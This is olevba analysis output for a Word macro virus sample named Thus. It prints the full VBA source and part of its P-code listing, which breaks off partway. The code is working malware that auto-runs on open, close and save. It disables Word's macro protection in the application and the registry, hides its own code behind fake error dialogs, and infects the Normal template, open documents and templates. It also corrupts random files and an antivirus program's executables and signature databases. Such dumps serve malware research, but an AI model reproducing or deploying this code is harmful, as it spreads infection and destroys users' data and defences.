olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.ai
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.ai - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Thus_001'
'NIST_32abcp2C'
Private Declare Function CF& Lib "kernel32" Alias "CopyFileA" (ByVal _
    lpExistingFileName As String, ByVal lpNewFileName As String, ByVal _
    bFailIfExists As Long)

Private Sub Document_Open()
Dim Res As String, x As String, k As Integer, Sd As Boolean, Nt As Boolean
    On Error Resume Next
2
    If Application.ShowVisualBasicEditor Then GoTo 2
With Application
    .EnableCancelKey = 0
    .ScreenUpdating = False
    .Options.VirusProtection = Chr(3696 / 7 / 11)
    .Options.ConfirmConversions = Chr(8976 / 11 / 17)
    .Options.SaveNormalPrompt = Chr(1872 / 3 / 13)
    .Options.SavePropertiesPrompt = Chr(9072 / 9 / 21)
    .Options.DefaultOpenFormat = 1
    .DefaultSaveFormat = ""
    .DisplayAlerts = 0
    .DisplayStatusBar = Chr(48)
End With
         WordBasic.DisableAutoMacros 0
    If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 14) <> "'NIST_32abcp2C" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    Nt = -1
    End If
         Randomize
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Left(Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 14) <> "'NIST_32abcp2C" Then
    Sd = Application.Documents.Item(k).Saved
    Application.Documents.Item(k).ReadOnlyRecommended = Chr(48)
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If Application.Documents.Item(k).SaveFormat > 1 Then
    Application.Documents.Item(k).SaveAs FileFormat:=0, ReadOnlyRecommended:=0
    Else: If (Sd) And (Dir(Application.Documents.Item(k).FullName, 7) <> "") Then Application.Documents.Item(k).Save
    End If
    End If
    Next k
    For k = 1 To Application.Templates.Count
    If Left(Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 14) <> "'NIST_32abcp2C" Then
    Sd = Application.Templates.Item(k).Saved
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Templates.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If (Sd) And (Dir(Application.Templates.Item(k).FullName, 7) <> "") Then Application.Templates.Item(k).Save
    End If
    Next k
    If Nt Then Exit Sub
Dpio
Sd = ActiveDocument.Saved
If (Sd = False) And (ActiveDocument.ReadOnly = False) Then
       If Dir(ActiveDocument.FullName, 7) = "" Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=0, ReadOnlyRecommended:=0
       Else: ActiveDocument.Save
       End If
       Sd = ActiveDocument.Saved
       ActiveDocument.Saved = False
End If
If (Sd) And (ActiveDocument.SaveFormat < 2) Then Rcy ActiveDocument.FullName
Asd
x = Gds()
Res = Rdr(Mid(x, Int((Len(x) * Rnd) + 1), 1) & Chr(58) & Chr(92))
If Res <> "" Then x = Rfe(Res, "*.*")
If x <> "" Then Res = Res & x Else Res = ""
If Res <> "" Then Dfe Res
    Application.ScreenUpdating = True
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
Private Sub AutoExec()
    Document_Open
End Sub
Private Sub AutoExit()
    Document_Open
End Sub
Private Sub FileOpen()
On Error Resume Next
With Dialogs(80)
    .Display
If .Name <> "" Then
     SetAttr .Name, 0
    .ReadOnly = Chr(48)
    .ConfirmConversions = 0
    .Execute
End If
End With
End Sub
Private Sub AutoSave()
    Document_Open
End Sub
Private Sub Auto_Save()
    Document_Open
End Sub
Private Sub ToolsMacro()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub ViewVBCode()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub FileTemplates()
Document_Open
MsgBox "Global template not loaded", 16
End Sub
Private Sub ToolsOptions()
    Application.Options.VirusProtection = Chr(49)
    Dialogs(974).Show
    Application.Options.VirusProtection = Chr(48)
End Sub
Private Function Gds() As String
Const Rt = ":\"
Dim FileNum As Integer
Dim St As String
Dim i As Byte
On Error Resume Next
    FileNum = FreeFile
    For i = 1 To 24
    St = Chr(66 + i) & Rt & Chr(96)
    Open St For Binary As #FileNum
    Close #FileNum
    Kill St
    If Err = 0 Then Gds = Gds & Chr(66 + i) Else Err.Clear
    Next i
End Function
Private Function Rdd(ByVal Path As String) As String
Const Maska = "*.*"
Dim n As Integer, i As Integer
Dim Buf(1 To 4000) As String
Dim FindNmi As String
       n = 0
       i = 1
If Right(Path, 1) <> "\" Then Path = Path & "\"
On Error GoTo Errs
  FindNmi = Dir(Path, 23)
  Do While FindNmi <> ""
    If (GetAttr(Path & FindNmi) And vbDirectory) = vbDirectory Then
        If Mid(FindNmi, 1, 1) <> "." Then
                  n = n + 1
             Buf(i) = FindNmi
                    i = i + 1
        End If
    End If
         FindNmi = Dir
  Loop
        Rdd = UCase(Path & Buf(Int((n * Rnd) + 1)))
Errs:
        If n = 0 Then Rdd = ""
End Function
Private Function Rdr(ByVal Path As String) As String
Const Root = ":"
Dim tmp As String
Dim i As Integer
Dim GetRandom As Integer
Dim RandStep As Integer
   GetRandom = Int((1001 * Rnd) + 1)
     RandStep = 0

   For i = 1 To 10
        tmp = Rdd(Path)
        If tmp <> "" Then Path = tmp
        If (tmp = "") And (i = 1) Then
              Rdr = ""
              Exit Function
        End If
        If (tmp = "") And (i <> 1) Then
              Rdr = Path & "\"
              Exit Function
        End If
    Select Case RandStep
        Case 0 To 200
            RandStep = RandStep + 200
        Case 400 To 600
            RandStep = RandStep + 100
        Case 700 To 900
            RandStep = RandStep + 50
    End Select
        If RandStep >= GetRandom Then
             Rdr = Path & "\"
             Exit Function
        End If
     Next i
End Function
Private Function Rfe(ByVal Path As String, Maska As String) As String
Dim n As Integer, i As Integer
Dim Buf(1 To 4000) As String
Dim FindNmi As String
           n = 0
           i = 1
Path = Path & Maska
  On Error GoTo Errs
  FindNmi = Dir(Path, 7)
  Do While FindNmi <> ""
          n = n + 1
        Buf(i) = FindNmi
            i = i + 1
         FindNmi = Dir
  Loop
        Rfe = UCase(Buf(Int(n * Rnd) + 1))
Errs:
        If n = 0 Then Rfe = ""
End Function
Private Sub Dfe(Path As String)
Dim Attr As Integer
Dim Siz As Long, Cmp As Long
Dim FileNum As Integer
Dim i As Integer
Dim Ofs As Byte
On Error GoTo Ends
    Siz = FileLen(Path)
If Siz < 11 Then Exit Sub
    Attr = GetAttr(Path)
    SetAttr Path, 0
    FileNum = FreeFile
Open Path For Binary As #FileNum
    If Siz < 32763 Then Ofs = 9 Else Ofs = 3
    Get #FileNum, Siz - Ofs, Cmp
If Siz = Cmp Then Exit Sub
    Cmp = Siz
If Siz > 32763 Then Siz = 32763
ReDim Buf(1 To Siz) As Byte
        Rnd (-100)
    Get #FileNum, 10, Buf
    For i = 1 To Siz
    Buf(i) = Buf(i) Xor Int((255 * Rnd) + 0)
    Next i
    Put #FileNum, 10, Buf
        Cmp = Cmp + Ofs
    Put #FileNum, Cmp - Ofs, Cmp
    Close #FileNum
    SetAttr Path, Attr
Ends:
End Sub
Private Sub Rcy(Sours As String)
Dim Fls As String, DirR As String
Dim k As Long, Er As Integer, a As Integer
On Error GoTo YYY
Do
Fls = Gds
DirR = Rdr(Mid(Fls, Int((Len(Fls) * Rnd) + 1), 1) & Chr(58) & Chr(92))
Fls = Rfe(DirR, "*.*")
Er = Er + 1
If Er > 10 Then Exit Sub
Loop Until Fls <> ""
k = InStr(1, Fls, ".", 1)
If k <> 0 Then
Fls = Left(Fls, Len(Fls) - (Len(Fls) - k) - 1)
End If
Fls = Fls & ".DOC"
DirR = DirR & Fls
If Dir(DirR, 7) <> "" Then
    a = 1
    Er = GetAttr(DirR)
    SetAttr DirR, 0
End If
k = CF&(Sours, DirR, 0)
If a Then SetAttr DirR, Er
YYY:
End Sub
Private Sub Dpio()
Const Path = "\Software\Microsoft\Office\"
Const Ver = "8.0\"
Const NewUse = "New User Settings\"
Const Def = "\.Default"
Dim Keys(1 To 3) As String
Keys(1) = "HKEY_LOCAL_MACHINE"
Keys(2) = "HKEY_CURRENT_USER"
Keys(3) = "HKEY_USERS"
Dim Dis(1 To 3) As String
Dis(1) = "EnableMacroVirusProtection"
Dis(2) = "Options6"
Dis(3) = "MacroVirusProtection"
Dim AddId(1 To 6) As String
AddId(1) = "Word\Options"
AddId(2) = "Excel\Microsoft Excel"
AddId(3) = "PowerPoint\Options"
AddId(4) = "Word\7.0\Options"
AddId(5) = "Excel\7.0\Microsoft Excel"
AddId(6) = "PowerPoint\7.0\Options"
Dim i As Integer
Dim k As Integer
Dim x As Integer
Dim Use As String
On Error Resume Next
With System
Use = .PrivateProfileString("", Keys(1) & "\System\CurrentControlSet\control", "Current User")
If Use <> ".Default" Then x = 3 Else x = 2
For k = 1 To x
For i = 1 To 3
Select Case k
Case 1
.PrivateProfileString("", Keys(k) & Path & Ver & NewUse & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & NewUse & AddId(i + 3), Dis(i)) = Chr(48)
Case 2
.PrivateProfileString("", Keys(k) & Path & Ver & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
Case 3
.PrivateProfileString("", Keys(k) & Def & Path & Ver & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & Def & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
End Select
Next i
Next k
End With
End Sub
Private Sub Asd()
Const Path1 = "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Const Path2 = "\System\CurrentControlSet\Services\VxD\SpIDer"
Const Key = "HKEY_LOCAL_MACHINE"
Const RN = "RUNDLL.EXE"
Dim Nmi As String
Dim ProgPath As String
On Error Resume Next
Nmi = Chr(83) & Chr(112) & Chr(73) & Chr(68) & Chr(101) & Chr(114)
With System
ProgPath = .PrivateProfileString("", Key & Path1, Nmi)
If (ProgPath <> "") And (ProgPath <> RN) Then
.PrivateProfileString("", Key & Path1, Nmi) = RN
.PrivateProfileString("", Key & Path2, "StaticVxD") = "*IOS"
ProgPath = Ptd(ProgPath)
Nmi = Dir(ProgPath & "*.EXE", 7)
Do While Nmi <> ""
Dfe (ProgPath & Nmi)
Nmi = Dir
Loop
Nmi = Dir(ProgPath & "*.VDB", 7)
Do While Nmi <> ""
Dfe (ProgPath & Nmi)
Nmi = Dir
Loop
End If
End With
End Sub
Private Function Ptd(Path As String) As String
Dim tmp As String
Dim i As Long, k As Long
On Error GoTo Sti
If Path = "" Then GoTo Sti
k = Len(Path)
For i = k To 1 Step -1
    If Mid(Path, i, 1) = "\" Then Exit For
Next i
Ptd = Left(Path, i)
Exit Function
Sti:
    Ptd = ""
End Function








-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thus.ai
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 21513 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0009 "Thus_001'"
' Line #2:
' 	QuoteRem 0x0000 0x000E "NIST_32abcp2C'"
' Line #3:
' 	LineCont 0x0008 0A 00 04 00 14 00 04 00
' 	FuncDefn (Private Declare Function CF Lib "kernel32" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long))
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Document_Open())
' Line #6:
' 	Dim 
' 	VarDefn Res (As String)
' 	VarDefn x (As String)
' 	VarDefn k (As Integer)
' 	VarDefn Sd (As Boolean)
' 	VarDefn Nt (As Boolean)
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LineNum 2 
' Line #9:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #10:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #11:
' 	LitDI2 0x0000 
' 	MemStWith EnableCancelKey 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #13:
' 	LitDI2 0x0E70 
' 	LitDI2 0x0007 
' 	Div 
' 	LitDI2 0x000B 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitDI2 0x2310 
' 	LitDI2 0x000B 
' 	Div 
' 	LitDI2 0x0011 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt ConfirmConversions 
' Line #15:
' 	LitDI2 0x0750 
' 	LitDI2 0x0003 
' 	Div 
' 	LitDI2 0x000D 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	LitDI2 0x2370 
' 	LitDI2 0x0009 
' 	Div 
' 	LitDI2 0x0015 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SavePropertiesPrompt 
' Line #17:
' 	LitDI2 0x0001 
' 	MemLdWith Options 
' 	MemSt DefaultOpenFormat 
' Line #18:
' 	LitStr 0x0000 ""
' 	MemStWith DefaultSaveFormat 
' Line #19:
' 	LitDI2 0x0000 
' 	MemStWith DisplayAlerts 
' Line #20:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith DisplayStatusBar 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #23:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000E 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000E "'NIST_32abcp2C"
' 	Ne 
' 	IfBlock 
' Line #24:
' 	LineCont 0x0008 0C 00 04 00 1A 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #25:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Nt 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	ArgsCall Read 0x0000 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	LineCont 0x000C 0C 00 04 00 1A 00 04 00 26 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #32:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #33:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000E 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000E "'NIST_32abcp2C"
' 	Ne 
' 	IfBlock 
' Line #34:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St Sd 
' Line #35:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt ReadOnlyRecommended 
' Line #36:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd SaveFormat 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #41:
' 	LitDI2 0x0000 
' 	ParamNamed FileFormat 
' 	LitDI2 0x0000 
' 	ParamNamed ReadOnlyRecommended 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0002 
' Line #42:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld Sd 
' 	Paren 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Count 
' 	For 
' Line #47:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000E 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000E "'NIST_32abcp2C"
' 	Ne 
' 	IfBlock 
' Line #48:
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St Sd 
' Line #49:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	Ld Sd 
' 	Paren 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	Ld Nt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #57:
' 	ArgsCall Dpio 0x0000 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St Sd 
' Line #59:
' 	Ld Sd 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitDI2 0x0000 
' 	ParamNamed FileFormat 
' 	LitDI2 0x0000 
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #62:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St Sd 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld Sd 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0002 
' 	Lt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall Rcy 0x0001 
' 	EndIf 
' Line #68:
' 	ArgsCall Asd 0x0000 
' Line #69:
' 	ArgsLd Gds 0x0000 
' 	St x 
' Line #70:
' 	Ld x 
' 	Ld x 
' 	FnLen 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Rdr 0x0001 
' 	St Res 
' Line #71:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd Rfe 0x0002 
' 	St x 
' 	EndIf 
' Line #72:
' 	Ld x 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	Ld x 
' 	Concat 
' 	St Res 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Res 
' 	EndIf 
' Line #73:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	ArgsCall Dfe 0x0001 
' 	EndIf 
' Line #74:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #75:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #76:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Private Sub Document_Close())
' Line #79:
' 	ArgsCall Document_Open 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Private Sub Document_New())
' Line #82:
' 	ArgsCall Document_Open 0x0000 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Private Sub AutoExec())
' Line #85:
' 	ArgsCall Document_Open 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Private Sub AutoExit())
' Line #88:
' 	ArgsCall Document_Open 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Private Sub FileOpen())
